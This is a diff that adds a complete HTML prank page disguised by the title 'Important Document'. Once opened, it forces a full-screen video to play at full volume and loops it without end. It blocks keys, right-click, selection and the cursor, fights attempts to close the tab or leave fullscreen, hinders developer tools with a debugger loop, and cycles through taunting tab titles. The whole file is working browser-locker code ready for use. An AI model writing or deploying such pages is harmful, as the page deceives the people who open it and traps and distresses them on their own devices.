@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Important Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            overflow: hidden;
+            cursor: none;
+        }
+
+        /* VIDEO COVERS FULL SCREEN */
+        #prankVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 99999;
+        }
+
+        /* BLOCK EVERYTHING ON TOP */
+        #blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999999;
+            background: transparent;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- FULL SCREEN VIDEO -->
+    <video id="prankVideo" playsinline>
+        <!-- 
+            ============================
+            PUT YOUR VIDEO FILE HERE
+            ============================
+            Replace "prank.mp4" with your video file name.
+            Keep the video file in the SAME folder as this HTML file.
+        -->
+        <source src="video/new.mp4" type="video/mp4">
+    </video>
+
+    <!-- INVISIBLE BLOCKER - BLOCKS ALL CLICKS -->
+    <div id="blocker"></div>
+
+    <script>
+        const video = document.getElementById('prankVideo');
+        const blocker = document.getElementById('blocker');
+
+        // ========== FORCE PLAY VIDEO ==========
+        function forcePlay() {
+            video.muted = false;
+            video.volume = 1.0;
+            video.currentTime = 0;
+            video.play().catch(() => {
+                // If browser blocks unmuted autoplay, start muted then unmute
+                video.muted = true;
+                video.play().then(() => {
+                    // Try to unmute after playing
+                    setTimeout(() => {
+                        video.muted = false;
+                    }, 100);
+                });
+            });
+        }
+
+        // ========== START ON PAGE LOAD ==========
+        window.addEventListener('load', forcePlay);
+
+        // ========== IF THEY CLICK ANYWHERE - FORCE PLAY WITH SOUND ==========
+        document.addEventListener('click', () => {
+            video.muted = false;
+            video.volume = 1.0;
+            video.play();
+        });
+
+        document.addEventListener('touchstart', () => {
+            video.muted = false;
+            video.volume = 1.0;
+            video.play();
+        });
+
+        // ========== VIDEO LOOPS FOREVER ==========
+        video.addEventListener('ended', () => {
+            video.currentTime = 0;
+            video.play();
+        });
+
+        // ========== IF VIDEO PAUSES - FORCE PLAY AGAIN ==========
+        video.addEventListener('pause', () => {
+            setTimeout(() => {
+                video.play();
+            }, 10);
+        });
+
+        // ========== BLOCK ALL KEYBOARD SHORTCUTS ==========
+        document.addEventListener('keydown', (e) => {
+            // Block: Escape, Space, F5, Ctrl+W, Ctrl+F4, Alt+F4, Tab
+            e.preventDefault();
+            e.stopPropagation();
+
+            // If they press any key - make sure video is playing with sound
+            video.muted = false;
+            video.volume = 1.0;
+            video.play();
+
+            return false;
+        });
+
+        // ========== BLOCK RIGHT CLICK ==========
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            return false;
+        });
+
+        // ========== BLOCK CLOSING TAB ==========
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        // ========== TRY FULLSCREEN ==========
+        function tryFullscreen() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) {
+                el.requestFullscreen().catch(() => {});
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
+            } else if (el.msRequestFullscreen) {
+                el.msRequestFullscreen();
+            }
+        }
+
+        // Fullscreen on first click
+        document.addEventListener('click', tryFullscreen, { once: true });
+        document.addEventListener('touchstart', tryFullscreen, { once: true });
+
+        // ========== IF THEY EXIT FULLSCREEN - GO BACK ==========
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                setTimeout(tryFullscreen, 100);
+            }
+        });
+
+        // ========== KEEP CHECKING VIDEO IS PLAYING ==========
+        setInterval(() => {
+            if (video.paused) {
+                video.play().catch(() => {});
+            }
+            video.volume = 1.0;
+        }, 500);
+
+        // ========== BLOCK SELECTING TEXT ==========
+        document.onselectstart = () => false;
+        document.ondragstart = () => false;
+
+        // ========== CHANGE TAB TITLE ==========
+        const titles = [
+            '😂 YOU CANT ESCAPE',
+            '🤡 ENJOY THE SHOW',
+            '💀 HAHAHA',
+            '😈 PRANKED!!!',
+            '🤣 CLOSE ME IF YOU CAN'
+        ];
+        let ti = 0;
+        setInterval(() => {
+            document.title = titles[ti % titles.length];
+            ti++;
+        }, 1000);
+
+        // ========== HIDE CURSOR ==========
+        document.body.style.cursor = 'none';
+
+        // ========== DISABLE DEVTOOLS (F12) ==========
+        setInterval(() => {
+            debugger;
+        }, 1000);
+
+    </script>
+
+</body>
+</html>
